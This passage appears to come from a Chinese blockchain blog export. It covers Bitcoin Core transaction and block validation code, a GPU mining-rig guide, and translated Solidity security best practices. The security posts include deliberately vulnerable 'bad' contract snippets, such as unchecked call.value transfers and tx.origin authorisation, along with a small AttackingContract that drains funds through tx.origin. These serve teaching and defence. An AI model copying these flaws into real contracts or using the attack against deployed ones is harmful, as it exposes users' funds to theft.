交易校验每一个独立节点在校验每一笔接收到的交易时，都遵循如下标准：1、交易的语法和数据结构必须正确2、交易的字节大小在限制范围内3、每一个输出值，必须在规定的范围内4、没有哈希等于0，N等于-1的输入5、锁定时间在限制范围内6、交易的字节大小不小于1007、交易中的签名不大于签名操作的上限8、解锁脚本，锁定脚本格式规范9、池中或位于主分支区块中的一个匹配交易必须是存在的10、对于每一个输入，如果引用的输出存在于池中任何的交易，该交易将被拒绝11、对于每一个输入，在主分支和交易池中寻找引用的输出交易。如果输出交易缺少任何一个输入，该交易将成为一个孤立的交易。如果与其匹配的交易还没有出现在池中，那么将被加入孤儿交易池12、对于每一个输入，如果引用的输出交易是一个coinbase输出，该输入需要等待100个确认才能生效13、对于每一个输入，引用的输出必须是存在的，并且没有被花费14、使用引用的输出交易获得输入值，并检查每一个输入值和总值是否在规定值的范围内15、如果输入值的总和小于输出值的总和，交易将被中止16、如果交易费用太低以至于无法进入一个空的区块，交易将被拒绝17、每一个输入的解锁脚本必须一句相应的锁定脚本来验证 以上的校验标准主要在比特币核心客户端CheckTransaction函数中获得，具体源码实现如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253bool CheckTransaction(const CTransaction&amp; tx, CValidationState &amp;state, bool fCheckDuplicateInputs)&#123; // 不依赖于上下文的基础性检查 // 校验输入是否为空，每笔交易都需有来源 if (tx.vin.empty()) return state.DoS(10, false, REJECT_INVALID, &quot;bad-txns-vin-empty&quot;); // 校验输出是否为空，每笔钱都应有去向 if (tx.vout.empty()) return state.DoS(10, false, REJECT_INVALID, &quot;bad-txns-vout-empty&quot;); // 大小校验 不考虑隔离见证数据 if (::GetSerializeSize(tx, SER_NETWORK, PROTOCOL_VERSION | SERIALIZE_TRANSACTION_NO_WITNESS) * WITNESS_SCALE_FACTOR &gt; MAX_BLOCK_WEIGHT) return state.DoS(100, false, REJECT_INVALID, &quot;bad-txns-oversize&quot;); // 校验输出值是否有效 CAmount nValueOut = 0; for (const auto&amp; txout : tx.vout) &#123; if (txout.nValue &lt; 0) return state.DoS(100, false, REJECT_INVALID, &quot;bad-txns-vout-negative&quot;); if (txout.nValue &gt; MAX_MONEY) return state.DoS(100, false, REJECT_INVALID, &quot;bad-txns-vout-toolarge&quot;); nValueOut += txout.nValue; if (!MoneyRange(nValueOut)) return state.DoS(100, false, REJECT_INVALID, &quot;bad-txns-txouttotal-toolarge&quot;); &#125; // 校验重复输入 注意该校验比较耗时，所以我们在CheckBlock时，跳过该步骤 if (fCheckDuplicateInputs) &#123; std::set&lt;COutPoint&gt; vInOutPoints; for (const auto&amp; txin : tx.vin) &#123; if (!vInOutPoints.insert(txin.prevout).second) return state.DoS(100, false, REJECT_INVALID, &quot;bad-txns-inputs-duplicate&quot;); &#125; &#125; // 对coinbase交易进行校验 if (tx.IsCoinBase()) &#123; // 检验coinbase的scriptSig大小是否在[2,100]范围内 if (tx.vin[0].scriptSig.size() &lt; 2 || tx.vin[0].scriptSig.size() &gt; 100) return state.DoS(100, false, REJECT_INVALID, &quot;bad-cb-length&quot;); &#125; else &#123; for (const auto&amp; txin : tx.vin) // 每笔交易必须有来源 if (txin.prevout.IsNull()) return state.DoS(10, false, REJECT_INVALID, &quot;bad-txns-prevout-null&quot;); &#125; return true;&#125; 校验输入12345678910111213141516171819202122232425262728293031323334353637383940414243// 检查指定交易的所有输入是否有效（不存在双花）bool CheckInputs(const CTransaction&amp; tx, CValidationState &amp;state, const CCoinsViewCache &amp;inputs, bool fScriptChecks, unsigned int flags, bool cacheSigStore, bool cacheFullScriptStore, PrecomputedTransactionData&amp; txdata, std::vector&lt;CScriptCheck&gt; *pvChecks)&#123; if (!tx.IsCoinBase()) &#123; if (pvChecks) pvChecks-&gt;reserve(tx.vin.size()); if (fScriptChecks) &#123; uint256 hashCacheEntry; static_assert(55 - sizeof(flags) - 32 &gt;= 128/8, &quot;Want at least 128 bits of nonce for script execution cache&quot;); CSHA256().Write(scriptExecutionCacheNonce.begin(), 55 - sizeof(flags) - 32).Write(tx.GetWitnessHash().begin(), 32).Write((unsigned char*)&amp;flags, sizeof(flags)).Finalize(hashCacheEntry.begin()); AssertLockHeld(cs_main); if (scriptExecutionCache.contains(hashCacheEntry, !cacheFullScriptStore)) &#123; return true; &#125; for (unsigned int i = 0; i &lt; tx.vin.size(); i++) &#123; const COutPoint &amp;prevout = tx.vin[i].prevout; const Coin&amp; coin = inputs.AccessCoin(prevout); assert(!coin.IsSpent()); CScriptCheck check(coin.out, tx, i, flags, cacheSigStore, &amp;txdata); if (pvChecks) &#123; pvChecks-&gt;push_back(CScriptCheck()); check.swap(pvChecks-&gt;back()); &#125; else if (!check()) &#123; if (flags &amp; STANDARD_NOT_MANDATORY_VERIFY_FLAGS) &#123; CScriptCheck check2(coin.out, tx, i, flags &amp; ~STANDARD_NOT_MANDATORY_VERIFY_FLAGS, cacheSigStore, &amp;txdata); if (check2()) return state.Invalid(false, REJECT_NONSTANDARD, strprintf(&quot;non-mandatory-script-verify-flag (%s)&quot;, ScriptErrorString(check.GetScriptError()))); &#125; return state.DoS(100,false, REJECT_INVALID, strprintf(&quot;mandatory-script-verify-flag-failed (%s)&quot;, ScriptErrorString(check.GetScriptError()))); &#125; &#125; if (cacheFullScriptStore &amp;&amp; !pvChecks) &#123; scriptExecutionCache.insert(hashCacheEntry); &#125; &#125; return true;&#125;","categories":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/categories/矿池/"}],"tags":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/tags/矿池/"},{"name":"LeonBCK","slug":"LeonBCK","permalink":"http://xingyunbite.github.com/tags/LeonBCK/"},{"name":"比特币","slug":"比特币","permalink":"http://xingyunbite.github.com/tags/比特币/"}],"keywords":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/categories/矿池/"}]},{"title":"比特币挖矿之区块校验","slug":"比特币挖矿之区块校验","date":"2018-03-09T03:15:45.000Z","updated":"2018-03-09T09:57:45.589Z","comments":false,"path":"2018/03/09/比特币挖矿之区块校验/","link":"","permalink":"http://xingyunbite.github.com/2018/03/09/比特币挖矿之区块校验/","excerpt":"","text":"在比特币挖矿之矿工任务中我们提到，矿工的首要任务是同步区块链已有数据，监听新区块。当新的区块在网络中传播时，每一个全节点在将它转发到其他节点之前，会进行一系列的测试去验证区块的合法性。下面我们将对校验标准进行具体介绍。 区块校验比特币区块的校验标准如下：1、区块头的的哈希值满足当前目标值（工作量证明）2、重构Merkle树得到的树根与区块头中hashMerkleRoot值一致（验证MerkleRoot是否由区块中交易得到）3、区块大小在长度限制内4、第一个交易是coinbase交易,且其他交易都不是coinbase交易5、遍历区块内所有交易，检查交易合法性 以上的校验标准主要在比特币核心客户端的CheckBlock函数中获得，具体源码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263bool CheckBlock(const CBlock&amp; block, CValidationState&amp; state, const Consensus::Params&amp; consensusParams, bool fCheckPOW, bool fCheckMerkleRoot)&#123; // These are checks that are independent of context. // 如果区块已经检查过，则直接返回结果true if (block.fChecked) return true; // 检查区块头是否满足工作量要求 if (!CheckBlockHeader(block, state, consensusParams, fCheckPOW)) return false; // 判断是否校验MerkleRoot 若检查，则校验MerkleRoot是否符合要求，是否存在重复交易 if (fCheckMerkleRoot) &#123; bool mutated; // 重新构建一遍Merkle树，返回MerkleRoot uint256 hashMerkleRoot2 = BlockMerkleRoot(block, &amp;mutated); if (block.hashMerkleRoot != hashMerkleRoot2) return state.DoS(100, false, REJECT_INVALID, &quot;bad-txnmrklroot&quot;,true, &quot;hashMerkleRoot mismatch&quot;); // Check for merkle tree malleability (CVE-2012-2459): repeating sequences // of transactions in a block without affecting the merkle root of a block, // while still invalidating it. if (mutated) return state.DoS(100, false, REJECT_INVALID, &quot;bad-txns-duplicate&quot;,true, &quot;duplicate transaction&quot;); &#125; // 在我们做任何的交易校验之前，应该首先做潜在的问题校验，这样一旦我们发现问题，便可以将区块头标记为无效 隔离见证数据并不在此处校验 // 大小限制 // 区块交易不为空，至少存在coinbase交易 // 区块size和weight符合要求 if (block.vtx.empty() || block.vtx.size() * WITNESS_SCALE_FACTOR &gt; MAX_BLOCK_WEIGHT || ::GetSerializeSize(block, SER_NETWORK, PROTOCOL_VERSION| SERIALIZE_TRANSACTION_NO_WITNESS) * WITNESS_SCALE_FACTOR &gt; MAX_BLOCK_WEIGHT) return state.DoS(100, false, REJECT_INVALID, &quot;bad-blk-length&quot;,false, &quot;size limits failed&quot;); // First transaction must be coinbase, the rest must not be // 校验首个交易是否是coinbase交易 if (block.vtx.empty() || !block.vtx[0]-&gt;IsCoinBase()) return state.DoS(100, false, REJECT_INVALID, &quot;bad-cb-missing&quot;, false,&quot;first tx is not coinbase&quot;); // 校验coinbase交易是否唯一 for (unsigned int i = 1; i &lt; block.vtx.size(); i++) if (block.vtx[i]-&gt;IsCoinBase()) return state.DoS(100, false, REJECT_INVALID, &quot;bad-cb-multiple&quot;,false, &quot;more than one coinbase&quot;); // Check transactions // 校验交易是否符合要求，此函数将在比特币挖矿之交易校验中具体介绍 for (const auto&amp; tx : block.vtx) if (!CheckTransaction(*tx, state, false)) return state.Invalid(false, state.GetRejectCode(),state.GetRejectReason(),strprintf(&quot;Transaction check failed (tx hash %s) %s&quot;, tx-&gt;GetHash().ToString(), state.GetDebugMessage())); unsigned int nSigOps = 0; for (const auto&amp; tx : block.vtx) &#123; nSigOps += GetLegacySigOpCount(*tx); &#125; if (nSigOps * WITNESS_SCALE_FACTOR &gt; MAX_BLOCK_SIGOPS_COST) return state.DoS(100, false, REJECT_INVALID, &quot;bad-blk-sigops&quot;, false,&quot;out-of-bounds SigOpCount&quot;); if (fCheckPOW &amp;&amp; fCheckMerkleRoot) block.fChecked = true; return ture;&#125; 检查区块头是否满足工作量要求12345678910static bool CheckBlockHeader(const CBlockHeader&amp; block, CValidationState&amp;state, const Consensus::Params&amp; consensusParams, bool fCheckPOW = true)&#123; // Check proof of work matches claimed amount // 检查工作量难度是否满足声明要求 // CheckProofOfWork方法已经在比特币挖矿之随机数中介绍过 if (fCheckPOW &amp;&amp; !CheckProofOfWork(block.GetHash(), block.nBits,consensusParams)) return state.DoS(50, false, REJECT_INVALID, &quot;high-hash&quot;, false, &quot;proof of work failed&quot;); return ture;&#125;","categories":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/categories/矿池/"}],"tags":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/tags/矿池/"},{"name":"LeonBCK","slug":"LeonBCK","permalink":"http://xingyunbite.github.com/tags/LeonBCK/"},{"name":"比特币","slug":"比特币","permalink":"http://xingyunbite.github.com/tags/比特币/"}],"keywords":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/categories/矿池/"}]},{"title":"智能合约最佳实践翻译一","slug":"智能合约最佳实践翻译一","date":"2018-03-09T03:06:28.000Z","updated":"2018-03-09T09:32:59.585Z","comments":false,"path":"2018/03/09/智能合约最佳实践翻译一/","link":"","permalink":"http://xingyunbite.github.com/2018/03/09/智能合约最佳实践翻译一/","excerpt":"","text":"原文链接 常规理念以太坊和复杂的区块链编程是崭新的和高度实验性的。 因此，随着新 bug 和安全风险的发现，您应该预期到安全形势会不断发生变化，并制定新的最佳实践。 因此，遵循本文档中的安全措施只是作为智能合约开发人员需要做的安全工作的开始。 智能合约编程需要一个与您过往习惯不同的工程思维。失败的代价可能很高，并且更改可能很困难，使得它在某些方面更像硬件编程或金融服务编程，而不是 Web 或移动开发。因此，防御已知的漏洞是不够的。相反，你需要学习一种新的开发理念： 做好失败的准备任何不平凡的（non-trivial）合约中都有错误。因此你的代码必须能够优雅地反馈 Bug 和漏洞。 当出现错误时暂停该合约（“电路中断者”） 管理风险金额（限制比例，设置最大使用量） 为错误修正和改进提供有效的升级途径 小心地推出在完整的产品发布前捕获错误总是更好。彻底地测试合约，并在每次发现新的攻击媒介时添加新的测试 - 从 alpha 测试网络起就提供 Bug 悬赏 - 随着每个阶段的使用和测试推出。 保持合约简单复杂性增加错误的可能性。 确定合约的逻辑简单 通过模块化使得合约和函数小巧 在可以使用的地方使用已经存在的工具或者代码（比如，不要使用你自己写的随机数生成器） 只要有可能，请尽量保持清晰 只对你的系统中需要去中心化的部分使用区块链 保持更新使用下一节中列出的资源跟踪新的安全开发。 检测你的合同是否有任何新发现的 bug 尽可能快的将工具或者类库更新到最新的版本 接受新的使用的安全技术 注意区块链的属性虽然你的编程经验大部分将与以太坊编程相关，但有一些陷阱需要注意。 要非常小心外部合约的调用，这可能会执行恶意代码并更改控制流。 了解你的公共函数是公开的，可能会被恶意地调用。任何人都可以查看您的私人数据。 记住燃料的消耗和区块燃料的限制。 基本权衡：简单与复杂的实例在评估智能合约系统的结构和安全性时，需要考虑多个基本的权衡。任何智能合约系统的常规建议是在这些基本的权衡之间找到合适的平衡点。 从软件工程来说，理想的智能合约系统是模块化的，复用代码而不是复制代码，并且支持组建可升级。从安全架构来看，一个理想的智能合约要分享它的观念模式，特别是复杂的智能合约系统。 但是，也存在着软件工程和安全不能保持一致的重要的例外。在这些情况下，通过顺着合约系统的维度的最佳组合获得合适的平衡点，比如： 静态 与 可升级 整体 与 模块化 重复 与 复用 静态和可升级尽管包括这个在内的多种资源强调拓展特性，例如可删除，可升级或者可修改的模式，但在可塑性和安全性之间还是需要一个基本的平衡。 根据定义，可塑性模式增加了复杂性和潜在的被攻击可能性。在智能合约系统在预定义的有限时间段内执行非常有限的一组功能的情况下，简单性比复杂性更有效率，例如，无管理的有限时间帧令牌销售合约系统。 单一整体和模块化一个单一的只有自身的合约保证了所有的内容都可以在自身被识别与读取。尽管几乎很少有被高度重视的智能合约系统作为一个庞然大物单独存在，但是也有一个理由极端地要求数据和流程在本地 - 例如，优化代码审查效率的情况下。 与在此考虑的其他平衡一样，安全最佳实践趋向于在简单短期合约中的使用软件工程最佳实践，以及在更复杂更长久的合约系统中趋向于软件工程最佳实践。 复制与复用从软件工程的角度看，智能合约系统希望在合理的情况下最大限度地提高重用率。在 Solidity 中有很多方法可以重用合约代码。使用自己拥有的经过验证的已经被部署了的合约通常是实现代码复用的最安全方式。 在自己之前已经部署的合约不可用的情况下，通常就会依赖复制。Live Libs 和 Zeppelin Solidity 等努力试图提供一些模式，一遍复用安全代码而不是复制。任何合约安全分析必须包含之前没有建立与目标智能合约系统中的资金风险相当的信任等级的任何复用的代码。","categories":[{"name":"区块链","slug":"区块链","permalink":"http://xingyunbite.github.com/categories/区块链/"}],"tags":[{"name":"ZhouFyk","slug":"ZhouFyk","permalink":"http://xingyunbite.github.com/tags/ZhouFyk/"},{"name":"以太坊","slug":"以太坊","permalink":"http://xingyunbite.github.com/tags/以太坊/"},{"name":"智能合约","slug":"智能合约","permalink":"http://xingyunbite.github.com/tags/智能合约/"},{"name":"安全开发","slug":"安全开发","permalink":"http://xingyunbite.github.com/tags/安全开发/"}],"keywords":[{"name":"区块链","slug":"区块链","permalink":"http://xingyunbite.github.com/categories/区块链/"}]},{"title":"2018年自己动手组装一台矿机吧--显卡矿机教程","slug":"2018年自己动手组装一台矿机吧-显卡矿机教程","date":"2018-03-02T09:31:52.000Z","updated":"2018-03-09T09:32:59.581Z","comments":false,"path":"2018/03/02/2018年自己动手组装一台矿机吧-显卡矿机教程/","link":"","permalink":"http://xingyunbite.github.com/2018/03/02/2018年自己动手组装一台矿机吧-显卡矿机教程/","excerpt":"","text":"市面上一些加密数字货币如ETH,Zcash等挖矿投资收益远远超过了比特币，在2017年造成了一卡难求的局面，即使现在币价有所回落，矿机仍然是供不应求，好多矿工甚至小白依然不能买到称心如意的矿机，那么，我们不如自己动手来组装适合自己的矿机，此处仅限显卡矿机。 显卡矿机和我们通常的电脑是一样的,主要硬件包含:显卡、主板、电源、CPU、内存、硬盘（SSD）、延长线、转接线等.其中显卡决定了挖矿的速度,主板、电源很大程度上决定矿机运行的稳定程度. 主板建议:显卡挖矿不需要很大的 PCIE 带宽.主板上具备 PCI-E 1X 即可满足带宽要求.一般主板上具有3-5个PCI-E 1X 接口，1个PCI-E 16X接口,此外主板上具有大4PIN供电接口对稳定性有一定的提升.PCI-E1X需要淘宝购买1X转16X延长线. 操作系统使用Windows 10 1703版最佳,建议使用官方原版.动手能力强的朋友可以使用ETH OS进行挖矿,这里不在赘述. 显卡建议:目前推荐使用AMD RX580/480/470/570;英伟达GTX1060/1070进行挖矿,建议显存4G以上. 同时,现在市场上出现了以昂达b250 btc-d8p为首的8卡直插主板,免去了转接线、延长线和驱动的繁琐调试,附图是一套8卡直插GTX 1066显卡矿机配置. 有不熟悉硬件的朋友可以找身边对电子产品了解且动手能力强的帮忙安装调试,同时需要进行超频,以GTX 1066挖以太坊为例,没超频前算力约为20 MH,超频后为23 MH,算力提升约为6%. N卡超频设置使用MSI Afterburner,打开MSI Afterburner后可以看到+-按钮进行操作,以我们公司的GTX 1066为例子,目前的调整参数为温度 85 ,核心频率 -90 ,显存频率 +735. 重点来了:在上面图片中可以看到显卡矿机的收益并不高,但是显卡矿机有个好处就是可以切换不同币种之间挖矿.例如,现在挖以太坊收益为每天61元,当新出一个币种A的时候,而A此时还没有交易所可以交易,我们可以进行预挖,一般在预挖的时候是产量是比较高的,这个时候留着币,当币种上线交易所,进行抛售套现,也是一个非常好的收益.如果A的收益偏低我们可以继续挖ETH,ZEC等稳定性的币种,充分利用显卡矿机的优势创造收益最大化.","categories":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/categories/矿池/"}],"tags":[{"name":"lucas556","slug":"lucas556","permalink":"http://xingyunbite.github.com/tags/lucas556/"},{"name":"矿机","slug":"矿机","permalink":"http://xingyunbite.github.com/tags/矿机/"}],"keywords":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/categories/矿池/"}]},{"title":"智能合约最佳实践翻译二","slug":"智能合约最佳实践翻译二","date":"2018-03-02T09:04:23.000Z","updated":"2018-03-09T09:32:59.585Z","comments":false,"path":"2018/03/02/智能合约最佳实践翻译二/","link":"","permalink":"http://xingyunbite.github.com/2018/03/02/智能合约最佳实践翻译二/","excerpt":"","text":"原文链接 对 Solidity 中的智能合约的安全推荐 Recommendations for Smart Contract Security in Solidity本页面展示了编写智能合约时应遵循的一些 solidity 模式。 协议具体建议以下建议适用于以太坊中所有的智能合约的开发。 外部调用小心使用外部调用调用不受信任的合约会引入一些预期外的风险或错误。外部调用可能会在该合约或其依赖的任何其他合约中执行恶意代码。所以每个外部调用都要被当做潜在的安全风险来对待。如果不可能或不希望删除外部调用，请使用本节其余部分的建议来减少危险 标记不受信任的合约当与外部合约交互的时候，通过某种形式命名你的变量，方法和合约接口来清楚地表达其所交互的对象是具有潜在性的安全问题的。这适用于你的调用外部合约的函数。 123456789101112131415// badBank.withdraw(100); // Unclear whether trusted or untrusted// Isn&apos;t clear that this function is potentially unsafefunction makeWithdrawal(uint amount) &#123; Bank.withdraw(amount);&#125;// goodUntrustedBank.withdraw(100);TrustedBank.withdraw(100);function makeUntrustedWithdrawal(uint amount) &#123; UntrustedBank.withdraw(amount);&#125; 避免在外部调用之后改变状态不论是否使用 raw calls（someAddress,call() 的格式） 或者 contract calls（ExternalContract.someMethod() 的格式），都假定会执行恶意代码。即使 ExternalContract 不是恶意的，但它调用的任何合约也可能会执行恶意代码。 一个特殊的危险是，恶意代码可能对控制流进行了 hijack 攻击，导致条件竞争。（见 Race Conditions 了解更多关于这个问题的讨论）。 如果你调用了一个不受信任的外部合约，避免在调用之后改变状态。这个模式也常常作为 check-effects-interactions 模式 为人们所知。 注意 send() / transfer() / call.value() 之间的平衡在发送 ether 时注意 someAddress.send() / someAddress.transfer() / someAddress.call.value()() 之间的使用的关系的平衡。 someAddress.send() 和 someAddress.transfer() 被认为对于重入是安全的。尽管这些方法仍然会触发代码的执行，但是被调用的合约只会被提供 2300 单位的燃料，目前来说，这么多的燃料足够用来记录事件了。 x.transfer(y) 和 require(x.send(y)); 的等同的，如果发送失败，它会自动回退。 someAddress.call.value(y)() 会发送提供的以太币，然后触发代码的执行。为执行的代码提供所有可用来执行的燃料使得这种转账方式对于重入来说很不安全。 使用 send() 和 transfer() 可以防止重入，但是这样的做法会使得与那些 fallback 函数的消耗超过 2300 单位燃料的合约不兼容。也可以使用 someAddress.vall.value(ethAmount).gas(gasAmount)() 来转发指定的燃料数量。 一个试图平衡这个问题的解决办法是实现 退和拉 的机制模式， 推送 部分使用 send() 或者 transfer() ，拉 部分使用 call.value() 。 值得指出的是，对于价值转移而言，专用 send() 或者 transfer() 并不能使得合约避免重入的安全问题，但是能够使得一些特定的转账避免重入的安全问题。 解决外部调用的错误Solidity 提供了处理原生地址的底层调用方法：address.call()，address.callcode()，address,delegatecall()，和 address.send()。当调用遇到一个异常的时候，这些底层方法不会抛出一个异常，而是返回一个 false。从另一方面来说，合约调用（如 ExternalContract.doSomething()）会自动传播一个异常（比如，如果 doSomething() 抛出异常，ExternalContract.doSomething() 也会 throw）。 如果你选择使用底层调用方法，要确定你通过检查返回值，处理了可能存在的调用失败的情况。 1234567891011// badsomeAddress.send(55);someAddress.call.value(55)(); // this is doubly dangerous, as it will forward all remaining gas and doesn&apos;t check for resultsomeAddress.call.value(100)(bytes4(sha3(&quot;deposit()&quot;))); // if deposit throws an exception, the raw call() will only return false and transaction will NOT be reverted// goodif (!someAddress.send(55)) &#123; // some failure code&#125;ExternalContract(someAddress).deposit.value(100); 对外部调用来说，拉比推更好外部调用可能有意无意而失败。为了最小化这样失败带来的破坏，通常最好将每个外部调用隔离到可以由调用接收方发起的自己的交易中。这与支付特别相关，与将资金自动推给用户比起来，更好的是让用户提取资金。（这也减少了燃料限制问题。）避免在单个交易中组合多个 send() 12345678910111213141516171819202122232425262728293031323334353637383940// badcontract auction &#123; address highestBidder; uint highestBid; function bid() payable &#123; require(msg.value &gt;= highestBid); if (highestBidder != 0) &#123; highestBidder.transfer(highestBid); // if this call consistently fails, no one else can bid &#125; highestBidder = msg.sender; highestBid = msg.value; &#125;&#125;// goodcontract auction &#123; address highestBidder; uint highestBid; mapping(address =&gt; uint) refunds; function bid() payable external &#123; require(msg.value &gt;= highestBid); if (highestBidder != 0) &#123; refunds[highestBidder] += highestBid; // record the refund that this user can claim &#125; highestBidder = msg.sender; highestBid = msg.value; &#125; function withdrawRefund() external &#123; uint refund = refunds[msg.sender]; refunds[msg.sender] = 0; msg.sender.transfer(refund); &#125;&#125; 不要假设合约创建时是 0 资产一个攻击者可以在合约创建之前发送 wei 到合约的地址。合约不应该假设初始状态包含 0 资产。见 问题 61 查看更多细节。 记住链上的数据是公开的许多应用程序要求提交数据以便在某个时间点可以供其工作。游戏（如链上的石头剪子布）和拍卖机制（如 盲派的第二次出价）是两种主要类别的例子。如果你正在构建一个涉及到隐私的应用，注意不免要求用户过早发布信息。 示例： 在石头剪子布中，首先要求两个玩家同时提交他们的出手意图的哈希值，然后再要求提交他们的实际出手，如果匹配不上之前的哈希值，则抛出。 在一个拍卖中，要求玩家在初始阶段提交他们的出价金额的哈希值（保证金高于他们的竞价），然后在第二阶段提交他们的实际竞价。 当开发一个依赖于随机数生成器的应用时，顺序应该总是（1）提交行动，（2）生成随机数，（3）玩家付出。随机数生成方法本来就是一个活跃的研究领域；目前同类最佳的解决方案包括比特币区块头（通过 http://btcrelay.org 来验证），散列提交揭示方案（即一方产生一个数字，将其散列值发布为”提交“的值，然后揭示这个数）和 RANDAO 如果你正在实现一个频繁的批量拍卖，哈希提交方案也很合适。 注意在双方或者多方合约中，一些成员可能”掉线“，没有返回不要只依赖于特定方执行特定行动的退款或者索赔流程，而没有其他获得资金的方式。比如，在剪刀石头布游戏中，一个常见的错误是在两位玩家提交它们的行动之前，没有进行支付；然而，一个恶意的玩家可以简单地通过不提交他的动作来使得另一位玩家陷入困境 - 实际上，如果一个玩家看到了其他玩家暴露的行为，并且确定他们输了，他们就没有任何理由去提交他们自己的行为。这个问题也可能出现在状态渠道的解决中。当这样的场景变成一个问题，（1）提供一种规避未参与的参与者的方式，可能是通过限制时间，（2）考虑增加额外的经济激励，让参与者在需要提交信息的场景中提交所有该场景需要的信息。 Solidity 详细建议下面的建议对于 Solidity 来说十分详细，不过对于使用其他语言来开发智能合约来说，应该也是有所帮助的。 强制对不变值使用 assert()当一个断言失败的时候，它的保护机制就会被触发 - 比如当一个不变的属性改变的时候。比如，在一个代币发行合约中，代币与以太币的汇率可能是固定的。然后你可以通过 assert() 来验证所有的这种情况。断言保护机制应该经常与其他技术结合，如暂停合约和允许升级。（否则，你可能会陷入停滞，而一个断言总是在失败。） 例子： 12345678910contract Token &#123; mapping (address =&gt; uint) public balanceOf; uint public totalSupply; function deposit() public payable &#123; balanceOf[msg.sender] += msg.value; totalSupply += msg.value; assert(this.balance &gt;= totalSupply); &#125;&#125; 注意断言并非对资产严格相等，因为合约可以不通过 deposit 函数强制发送以太币 正确地使用 assert() 和 require()在 Solidity 0.4.10 中，引入了 assert() 和 require()。require(condition) 被用来对用户的任何输入进行验证，如果条件不成立则回滚。assert(condition) 在条件不成立时也会回滚，但是只用在不变值上：内部错误或者检查你的合约是否是非法的状态。遵循这种范式将允许形式分析工具来进行验证工作，而非法的操作码永远不会到达：这意味着代码中的任何不变值都不会被违反，并且代码正确地验证。 小心整数除法所有整数除法都被向下取整。如果你需要更高的精度，考虑使用乘数，或者存储分子和分母。 （在未来，Solidity 会有定点类型，这会使得整数除法更容易。） 12// baduint x = 5 / 2; // Result is 2, all integer divison rounds DOWN to the nearest integer 使用乘数来防止向下取整，当使用 x 的时候要考虑到这个乘数： 123// gooduint multiplier = 10;uint x = (5 * multipler) / 2; 存储分子和分母意味着你可以离链计算分子除以分母的结果。 123// gooduint numerator = 5;uint denominator = 2; 记住以太币可以被强制发送到一个账户注意对严格检查了的合约的余额进行编码。 一个攻击者可以强制对任何账户发送 wei，而且这不能被阻止（即使是使用了 revert() 的 fallback 函数也不可以） 攻击者通过创余额为 1 wei 的合约，然后通过 selfdestruct(victimAddress) 的方式达到目的。victimAddress 中没有代码被激活，所以这不能被阻止。 注意抽象合约和接口的平衡接口和抽象合约都为智能合约提供了一种定制的，可复用的方式。接口，在 Solidity 0.4.11 中被引入，与抽象合约十分相似，但是接口不能有已经实现的方法。接口同样也有限制，它不能访问存储，不能继承其他接口，而这通常使得抽象合约更加实用。虽然，接口实际上对设计合约的实现上十分有用。另外，十分重要的是如果一个合约继承了一个抽象合约，那它必须通过重写来实现所有抽象合约中未实现的函数，否则它依旧是一个抽象合约。 保持 fallback 函数简单当一个合约发送了没有参数（或者当没有函数匹配上的时候）的消息时，Fallback 函数 会被调用，而且如果通过 .send() 或者 .transfer() 调用的话只需要 2300 单位的燃料。如果你希望能够从 .send() 或者 .transfer() 接受以太币，你能做的就是在 fallback 函数中记录一个日志。如果需要计算，或者更多的燃料，就使用一个真正的函数。 1234567// badfunciton() payable &#123; balances[msg.sender] += msg.value; &#125;// goodfunction deposit() payable external &#123; balances[msg.sender] += msg.value; &#125;function() payable &#123; LogDepositReceived(msg.sender); &#125; 为函数和状态变量显式标记可见性显式标记函数和状态变量的可见性。函数可以被指定为 external / public / internal / private。请理解它们之间的区别，比如，比起 public，external 可能已经足够使用了。对于状态变量来说，external 是不可能的。显式标记可见性将更容易捕捉有关谁可以调用函数或访问变量的错误假设。 12345678910111213141516171819// baduint x; // the default is internal for state variables, but it should be made explicitfunction buy() &#123; // the default is public // public code&#125;// gooduint private y;function buy() external &#123; // only callable external&#125;function utility() public &#123; // callable externally, as well as internally: changing this code requires thinking about both cases&#125;function internalAction() internal &#123; // internal code&#125; 锁定指定编译器版本的编译指示应该使用相同的编译器版本部署合同，并标记它们已经经过了足够的测试。锁定编译指示可以帮助确保合约不会意外部署，比如，最新的编译器对未知错误有更高的风险。合约也可能由其他人部署，通过编译指示就知道原作者打算使用的编译器版本。 12345// bad pragma solidity ^0.4.4;// goodpragma solidity 0.4.0; 异常当合约打算供其他开发人员使用时，可以允许 pragma 语句浮动，例如类库或者 EthPM 包。否则，开发人员为了在本地编译就需要手动更新编译指示。 函数和事件的区别对事件名首字母大写,以及添加作用前缀，来防止对函数和事件产生困惑。对于方法来说，总是以小写字母开头，除了构造函数之外。 1234567// bad event Transfer() &#123;&#125;function transfer() &#123;&#125;// goodevent LogTransfer() &#123;&#125;function transfer() external &#123;&#125; 推荐使用更新的 Solidity 结构使用构造/别名如 selfdestruct （而不是 suicide），和 keccak256 （而不是 sha3）。require(msg.sender.send(1 ether)) 也可以使用 transfer() 简单地实现： msg.sender.transfer(1 ether)。 注意内置函数可以被覆盖目前可以在 Solidity 覆盖（shadow）内置的全局变量。它允许合约重写覆盖内置的方法，如 msg 和 revert()。尽管这是故意的，但是它可能会在关于合约的真实行为上误导合约的用户。 123456789contract PretendingToRevert &#123; function revert() internal constant &#123;&#125;&#125;contract ExampleContract is PretendingToRevert &#123; function somethingBad() public &#123; revert(); &#125;&#125; 合约用户（和审计人员）应该注意他们想要使用的应用的所有合约源代码。 避免使用 tx.origin永远不要使用 tx.origin 进行授权，另一个合约可以有一种方法来调用你的合约（比如用户有一些资金），而因为你的地址在 tx.origin 里面，你的合约就会授权该交易。 12345678910111213141516171819202122232425262728pragma solidity ^0.4.18;contract MyContract &#123; address owner; function MyContract() public &#123; owner = msg.sender; &#125; function sendTo(address receiver, uint amount) public &#123; require(tx.origin == owner); receiver.transfer(amount); &#125;&#125;contract AttackingContract &#123; MyContract myContract; address attacker; function AttackingContract(address myContractAddress) public &#123; myContract = MyContract(myContractAddress); attacker = msg.sender; &#125; function() public &#123; myContract.sendTo(attacker, msg.sender.balance); &#125;&#125; 你应该使用 msg.sender 